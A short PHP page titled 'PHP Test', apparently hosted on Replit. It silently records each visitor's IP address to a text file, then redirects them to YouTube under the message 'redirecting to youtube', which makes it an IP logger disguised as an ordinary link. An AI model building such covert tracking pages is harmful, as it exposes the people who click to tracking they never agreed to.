<html>
  <head>
    <title>PHP Test</title>
  </head>
  <body>    
    <?php 
			$url = 'youtube.com';
			$file = 'ip.txt';
			if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    		$ip = $_SERVER['HTTP_CLIENT_IP'];
			}elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
			} else {
    		$ip = $_SERVER['REMOTE_ADDR'];
			}
			echo "redirecting to youtube";
			$context = "IP - {$ip} |  URL - {$url} \r\n";
			file_put_contents($file, $context, FILE_APPEND);
		?>
    <script src="https://replit.com/public/js/replit-badge.js" theme="blue" defer></script> 

		<meta http-equiv="refresh" content="0.5; URL=https://youtube.com" />
  </body>
</html>
